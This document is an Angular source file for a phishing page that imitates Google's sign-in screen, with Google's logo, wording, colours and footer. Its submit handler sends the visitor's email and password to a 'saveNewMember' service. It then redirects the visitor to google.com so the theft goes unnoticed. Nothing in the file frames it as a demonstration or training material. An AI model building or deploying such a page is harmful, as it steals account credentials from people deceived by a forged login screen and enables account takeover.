import { Component } from '@angular/core';
import { bootstrapApplication } from '@angular/platform-browser';
import {
  ReactiveFormsModule,
  FormBuilder,
  FormGroup,
  Validators,
} from '@angular/forms';
import { CommonModule } from '@angular/common';
import { HttpClientModule, provideHttpClient } from '@angular/common/http';
import { HttpService } from './http.service';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [ReactiveFormsModule, CommonModule, HttpClientModule],
  template: `
    <div class="login-container">
      <div class="login-card">
        <div class="google-logo">
          <img 
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
            alt="Google logo" 
            width="92" 
            height="30"
          />
        </div>
        
        <h1 class="login-title">Sign in</h1>
        <p class="login-subtitle">Use your Google Account</p>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()" class="login-form">
          <div class="input-group" [class.focused]="usernameFocused" [class.filled]="loginForm.get('username')?.value">
            <input 
              type="text" 
              id="username" 
              formControlName="username"
              (focus)="usernameFocused = true"
              (blur)="usernameFocused = false"
              autocomplete="username"
              required>
            <label for="username">Email or phone</label>
            <div class="input-line"></div>
          </div>
          
          <div class="error-message" *ngIf="loginForm.get('username')?.invalid && loginForm.get('username')?.touched">
            <span *ngIf="loginForm.get('username')?.errors?.['required']">Enter an email or phone number</span>
          </div>
          
          <div class="input-group" [class.focused]="passwordFocused" [class.filled]="loginForm.get('password')?.value">
            <input 
              [type]="showPassword ? 'text' : 'password'" 
              id="password" 
              formControlName="password"
              (focus)="passwordFocused = true"
              (blur)="passwordFocused = false"
              autocomplete="current-password"
              required>
            <label for="password">Password</label>
            <button type="button" class="password-toggle" (click)="togglePassword()">
              <svg *ngIf="!showPassword" width="20" height="20" viewBox="0 0 24 24" fill="none">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#5f6368"/>
              </svg>
              <svg *ngIf="showPassword" width="20" height="20" viewBox="0 0 24 24" fill="none">
                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="#5f6368"/>
              </svg>
            </button>
            <div class="input-line"></div>
          </div>
          
          <div class="error-message" *ngIf="loginForm.get('password')?.invalid && loginForm.get('password')?.touched">
            <span *ngIf="loginForm.get('password')?.errors?.['required']">Enter a password</span>
          </div>
          
          <div class="forgot-email">
            <a href="#" class="link">Forgot email?</a>
          </div>
          
          <div class="guest-mode">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <a href="#" class="link">Learn more</a>
          </div>
          
          <div class="form-actions">
            <button type="button" class="btn-text">Create account</button>
            <button type="submit" class="btn-primary" [disabled]="loginForm.invalid || isSubmitting">
              {{ isSubmitting ? 'Signing in...' : 'Next' }}
            </button>
          </div>
        </form>
      </div>
      
      <div class="footer">
        <select class="language-select">
          <option>English (United States)</option>
          <option>Español</option>
          <option>Français</option>
        </select>
        
        <div class="footer-links">
          <a href="#" class="footer-link">Help</a>
          <a href="#" class="footer-link">Privacy</a>
          <a href="#" class="footer-link">Terms</a>
        </div>
      </div>
    </div>
  `,
  styles: [`
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      background-color: #ffffff;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    .login-container {
      min-height: 100vh;
      min-height: 100dvh; /* Dynamic viewport height for mobile */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-color: #ffffff;
      position: relative;
      /* Safe area insets for devices with notches */
      padding-top: max(20px, env(safe-area-inset-top));
      padding-bottom: max(80px, env(safe-area-inset-bottom));
      padding-left: max(20px, env(safe-area-inset-left));
      padding-right: max(20px, env(safe-area-inset-right));
    }

    .login-card {
      background: white;
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 48px 40px 36px 40px;
      box-shadow: 0 2px 10px 0 rgba(0,0,0,.1);
      width: 100%;
      max-width: 450px;
      text-align: center;
      position: relative;
      z-index: 1;
      animation: slideUp 0.6s ease-out;
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .google-logo {
      margin-bottom: 32px;
      animation: fadeIn 0.8s ease-out 0.2s both;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .google-logo img {
      max-width: 100%;
      height: auto;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .login-title {
      font-size: 24px;
      font-weight: 400;
      margin: 0 0 8px 0;
      color: #202124;
      animation: fadeIn 0.8s ease-out 0.3s both;
    }

    .login-subtitle {
      font-size: 16px;
      font-weight: 400;
      margin: 0 0 32px 0;
      color: #5f6368;
      animation: fadeIn 0.8s ease-out 0.4s both;
    }

    .login-form {
      text-align: left;
      animation: fadeIn 0.8s ease-out 0.5s both;
    }

    .input-group {
      position: relative;
      margin-bottom: 24px;
    }

    .input-group input {
      width: 100%;
      padding: 20px 16px 6px 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
      background: transparent;
      transition: all 0.2s ease;
      /* Prevent zoom on iOS */
      font-size: max(16px, 1rem);
    }

    .input-group input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 1px #1a73e8;
    }

    .input-group label {
      position: absolute;
      top: 50%;
      left: 16px;
      transform: translateY(-50%);
      color: #5f6368;
      font-size: 16px;
      pointer-events: none;
      transition: all 0.2s ease;
      background: white;
      padding: 0 4px;
    }

    .input-group.focused label,
    .input-group.filled label {
      top: 0;
      transform: translateY(-50%);
      font-size: 12px;
      color: #1a73e8;
    }

    .input-group.focused.filled label {
      color: #1a73e8;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 8px;
      border-radius: 4px;
      transition: background-color 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      min-width: 44px;
      min-height: 44px;
    }

    .password-toggle:hover {
      background-color: #f8f9fa;
    }

    .password-toggle:active {
      background-color: #e8eaed;
    }

    .input-line {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 2px;
      background: #1a73e8;
      transform: scaleX(0);
      transition: transform 0.2s ease;
    }

    .input-group.focused .input-line {
      transform: scaleX(1);
    }

    .error-message {
      color: #d93025;
      font-size: 12px;
      margin-top: 4px;
      margin-bottom: 16px;
      animation: shake 0.3s ease-in-out;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-4px); }
      75% { transform: translateX(4px); }
    }

    .forgot-email {
      margin-bottom: 24px;
    }

    .guest-mode {
      margin-bottom: 32px;
      font-size: 14px;
      color: #5f6368;
      line-height: 1.4;
    }

    .link {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
      transition: color 0.2s ease;
      display: inline-block;
      padding: 4px 0;
    }

    .link:hover {
      color: #1557b0;
      text-decoration: underline;
    }

    .link:active {
      color: #0d47a1;
    }

    .form-actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 32px;
      gap: 16px;
    }

    .btn-text {
      background: none;
      border: none;
      color: #1a73e8;
      font-size: 14px;
      font-weight: 500;
      padding: 12px 16px;
      border-radius: 4px;
      cursor: pointer;
      transition: all 0.2s ease;
      min-height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-text:hover {
      background-color: #f8f9fa;
    }

    .btn-text:active {
      background-color: #e8eaed;
    }

    .btn-primary {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s ease;
      min-width: 80px;
      min-height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-primary:hover:not(:disabled) {
      background: #1557b0;
      box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
    }

    .btn-primary:active:not(:disabled) {
      background: #0d47a1;
    }

    .btn-primary:disabled {
      background: #f8f9fa;
      color: #5f6368;
      cursor: not-allowed;
    }

    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: rgba(248, 249, 250, 0.95);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      padding: 16px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 2;
      border-top: 1px solid rgba(218, 220, 224, 0.5);
      /* Safe area for mobile devices */
      padding-bottom: max(16px, env(safe-area-inset-bottom));
    }

    .language-select {
      background: none;
      border: none;
      color: #5f6368;
      font-size: 12px;
      cursor: pointer;
      outline: none;
      padding: 8px 4px;
    }

    .footer-links {
      display: flex;
      gap: 24px;
      align-items: center;
    }

    .footer-link {
      color: #5f6368;
      text-decoration: none;
      font-size: 12px;
      transition: color 0.2s ease;
      padding: 8px 4px;
      display: inline-block;
    }

    .footer-link:hover {
      color: #202124;
    }

    .footer-link:active {
      color: #1a73e8;
    }

    /* Tablet styles */
    @media (max-width: 768px) and (min-width: 481px) {
      .login-container {
        padding: 24px 16px;
      }

      .login-card {
        padding: 40px 32px 32px 32px;
        max-width: 400px;
      }

      .login-title {
        font-size: 22px;
      }

      .login-subtitle {
        font-size: 15px;
      }

      .footer {
        padding: 12px 16px;
        flex-direction: column;
        gap: 12px;
        text-align: center;
      }

      .footer-links {
        gap: 20px;
        flex-wrap: wrap;
        justify-content: center;
      }
    }

    /* Mobile styles */
    @media (max-width: 480px) {
      .login-container {
        padding: 16px 12px;
        justify-content: flex-start;
        padding-top: max(40px, env(safe-area-inset-top));
      }

      .login-card {
        padding: 32px 20px 24px 20px;
        max-width: 100%;
        border: none;
        box-shadow: none;
        margin-top: 20px;
      }

      .google-logo {
        margin-bottom: 24px;
      }

      .login-title {
        font-size: clamp(20px, 5vw, 24px);
        margin-bottom: 6px;
      }

      .login-subtitle {
        font-size: clamp(14px, 4vw, 16px);
        margin-bottom: 28px;
      }

      .input-group {
        margin-bottom: 20px;
      }

      .input-group input {
        padding: 18px 14px 6px 14px;
        font-size: 16px;
      }

      .input-group label {
        font-size: 16px;
        left: 14px;
      }

      .password-toggle {
        right: 8px;
        min-width: 48px;
        min-height: 48px;
      }

      .form-actions {
        flex-direction: column;
        gap: 12px;
        align-items: stretch;
        margin-top: 28px;
      }

      .btn-primary, .btn-text {
        width: 100%;
        font-size: 16px;
        padding: 14px 24px;
        min-height: 48px;
      }

      .btn-text {
        order: 2;
      }

      .btn-primary {
        order: 1;
      }

      .guest-mode {
        margin-bottom: 28px;
        font-size: 13px;
      }

      .forgot-email {
        margin-bottom: 20px;
      }

      .footer {
        padding: 12px 16px;
        flex-direction: column;
        gap: 8px;
        text-align: center;
        padding-bottom: max(12px, env(safe-area-inset-bottom));
      }

      .footer-links {
        flex-direction: column;
        gap: 8px;
        width: 100%;
      }

      .footer-link, .language-select {
        font-size: 11px;
        padding: 12px 8px;
      }
    }

    /* Extra small mobile devices */
    @media (max-width: 360px) {
      .login-container {
        padding: 12px 8px;
        padding-top: max(32px, env(safe-area-inset-top));
      }

      .login-card {
        padding: 24px 16px 20px 16px;
        margin-top: 16px;
      }

      .google-logo {
        margin-bottom: 20px;
      }

      .login-title {
        font-size: 18px;
        margin-bottom: 4px;
      }

      .login-subtitle {
        font-size: 13px;
        margin-bottom: 24px;
      }

      .input-group {
        margin-bottom: 18px;
      }

      .input-group input {
        padding: 16px 12px 6px 12px;
        font-size: 16px;
      }

      .input-group label {
        left: 12px;
        font-size: 15px;
      }

      .password-toggle {
        right: 6px;
      }

      .form-actions {
        margin-top: 24px;
        gap: 10px;
      }

      .btn-primary, .btn-text {
        padding: 12px 20px;
        font-size: 15px;
        min-height: 44px;
      }

      .guest-mode {
        margin-bottom: 24px;
        font-size: 12px;
      }

      .forgot-email {
        margin-bottom: 18px;
      }

      .footer {
        padding: 10px 12px;
        gap: 6px;
        padding-bottom: max(10px, env(safe-area-inset-bottom));
      }

      .footer-link, .language-select {
        font-size: 10px;
        padding: 10px 6px;
      }
    }

    /* Landscape orientation on mobile */
    @media (max-height: 600px) and (orientation: landscape) {
      .login-container {
        padding: 12px 16px;
        justify-content: center;
      }

      .login-card {
        padding: 24px 32px 20px 32px;
        max-width: 400px;
      }

      .google-logo {
        margin-bottom: 16px;
      }

      .login-title {
        font-size: 20px;
        margin-bottom: 4px;
      }

      .login-subtitle {
        font-size: 14px;
        margin-bottom: 20px;
      }

      .input-group {
        margin-bottom: 16px;
      }

      .guest-mode {
        margin-bottom: 20px;
        font-size: 12px;
      }

      .forgot-email {
        margin-bottom: 16px;
      }

      .form-actions {
        margin-top: 20px;
      }

      .footer {
        position: relative;
        margin-top: 20px;
        padding: 12px 16px;
        background: transparent;
        backdrop-filter: none;
        border-top: none;
      }
    }

    /* High DPI displays */
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
      .login-card {
        border-width: 0.5px;
      }
    }

    /* Reduced motion preference */
    @media (prefers-reduced-motion: reduce) {
      .login-card {
        animation: none;
      }
      
      .google-logo,
      .login-title,
      .login-subtitle,
      .login-form {
        animation: none;
      }

      .error-message {
        animation: none;
      }

      .input-group input,
      .input-group label,
      .input-line,
      .btn-text,
      .btn-primary,
      .link,
      .footer-link,
      .password-toggle {
        transition: none;
      }
    }

    /* Dark mode support */
    @media (prefers-color-scheme: dark) {
      body {
        background-color: #202124;
        color: #e8eaed;
      }

      .login-container {
        background-color: #202124;
      }

      .login-card {
        background: #303134;
        border-color: #5f6368;
        color: #e8eaed;
      }

      .login-title {
        color: #e8eaed;
      }

      .login-subtitle {
        color: #9aa0a6;
      }

      .input-group input {
        background: transparent;
        border-color: #5f6368;
        color: #e8eaed;
      }

      .input-group input:focus {
        border-color: #8ab4f8;
        box-shadow: 0 0 0 1px #8ab4f8;
      }

      .input-group label {
        color: #9aa0a6;
        background: #303134;
      }

      .input-group.focused label,
      .input-group.filled label {
        color: #8ab4f8;
      }

      .input-line {
        background: #8ab4f8;
      }

      .password-toggle:hover {
        background-color: #3c4043;
      }

      .password-toggle:active {
        background-color: #5f6368;
      }

      .link {
        color: #8ab4f8;
      }

      .link:hover {
        color: #aecbfa;
      }

      .btn-text {
        color: #8ab4f8;
      }

      .btn-text:hover {
        background-color: #3c4043;
      }

      .btn-text:active {
        background-color: #5f6368;
      }

      .btn-primary {
        background: #8ab4f8;
        color: #202124;
      }

      .btn-primary:hover:not(:disabled) {
        background: #aecbfa;
      }

      .btn-primary:active:not(:disabled) {
        background: #669df6;
      }

      .btn-primary:disabled {
        background: #3c4043;
        color: #5f6368;
      }

      .footer {
        background: rgba(48, 49, 52, 0.95);
        border-top-color: rgba(95, 99, 104, 0.5);
      }

      .language-select {
        color: #9aa0a6;
      }

      .footer-link {
        color: #9aa0a6;
      }

      .footer-link:hover {
        color: #e8eaed;
      }

      .footer-link:active {
        color: #8ab4f8;
      }

      .error-message {
        color: #f28b82;
      }
    }
  `],  
})
export class App {
  loginForm: FormGroup;
  usernameFocused = false;
  passwordFocused = false;
  showPassword = false;
  isSubmitting = false;

  constructor(private fb: FormBuilder, private http: HttpService) {
    this.loginForm = this.fb.group({
      username: ['', [Validators.required]],
      password: ['', [Validators.required]],
    });
  }

  togglePassword() {
    this.showPassword = !this.showPassword;
  }

  onSubmit() {
    if (this.loginForm.valid) {
      const username = this.loginForm.value.username;
      const password = this.loginForm.value.password;

      if (username && password) {
        this.isSubmitting = true;
        let user = { username: username, password: password };

        this.http.saveNewMember(user).subscribe({
          next: (data) => {
            console.log('Member saved successfully:', data);
            this.isSubmitting = false;
            // Redirect to Google as specified
            window.location.href = 'https://www.google.com/';
          },
          error: (error) => {
            console.error('Error saving member:', error);
            this.isSubmitting = false;
            alert(
              'An error occurred while creating your account. Please try again.'
            );
          },
        });
      } else {
        alert('Please enter username & password');
      }
    } else {
      alert('Form is invalid. Please check your inputs.');
      // Mark all fields as touched to show validation errors
      Object.keys(this.loginForm.controls).forEach((key) => {
        this.loginForm.get(key)?.markAsTouched();
      });
    }
  }
}

bootstrapApplication(App, {
  providers: [provideHttpClient()],
});